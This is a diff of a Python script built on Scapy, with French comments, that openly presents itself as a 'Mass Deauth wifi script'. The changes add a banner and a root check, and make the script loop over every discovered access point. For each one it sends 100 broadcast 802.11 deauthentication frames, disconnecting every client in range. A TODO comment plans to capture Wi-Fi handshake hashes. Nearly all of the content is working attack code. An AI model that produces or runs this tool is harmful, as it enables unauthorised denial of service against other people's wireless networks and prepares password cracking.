@@ -1,26 +1,39 @@
+#!/usr/bin/python3
 from scapy.all import *
 from scapy.layers import *
 from prettytable import PrettyTable
 import argparse
+import sys
 
 """
 TODO
 
-le rendre joli :)
 chopper le hash wifi
 
 """
 
 def main():
+    print("""
+
+
+    ███╗   ███╗ █████╗ ███████╗███████╗    ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗
+    ████╗ ████║██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║
+    ██╔████╔██║███████║███████╗███████╗    ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║
+    ██║╚██╔╝██║██╔══██║╚════██║╚════██║    ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║
+    ██║ ╚═╝ ██║██║  ██║███████║███████║    ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║
+    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
+
+        """)
     # pour le --help
+    print(banner)
     parser = argparse.ArgumentParser(description='Mass Deauth wifi script\n\n Give to the script the interface name and the monitor interface name [without this wlan0 by default]')
     args = parser.parse_args()
     #verif droit sudo 
     if not os.geteuid() == 0:
-        print("SUDO requied !!")
+        print("[!] SUDO requied, please make a sudo command")
+        sys.exit()
     else:
         pass
-
 main()
 
 
@@ -77,19 +90,24 @@ display_wifi_networks(networks)
 
 #prise d'infos (client pour deauth)
 if bssid != False:
-    #pas besoin d'avoir le MAC du client pour deauth...
-    
-    def deauth_wifi(bssid, interface):
-        #addresse client mis sur une valeure NULL pour ne pas a avoir a trouvé un client heheheheh
-        packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth()
-        sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)
+    for bssid in networks:
+        #pas besoin d'avoir le MAC du client pour deauth...
 
-    # BOOM wifi deauth
+        def deauth_wifi(bssid, interface):
+            #construction de la requete deauth, avec la MAC de broadcast
 
-    deauth_wifi(bssid, interface)
+            packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth()
+
+            print("[+] DeAuth for {ssid} with MAC : {bssid}")
+
+            sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)
+
+        # BOOM wifi deauth
+
+        deauth_wifi(bssid, interface)
 
 else:
-    print("[-] Aucun réseau !")
+    print("[-] No wifi hotspot found !")
 
 
 
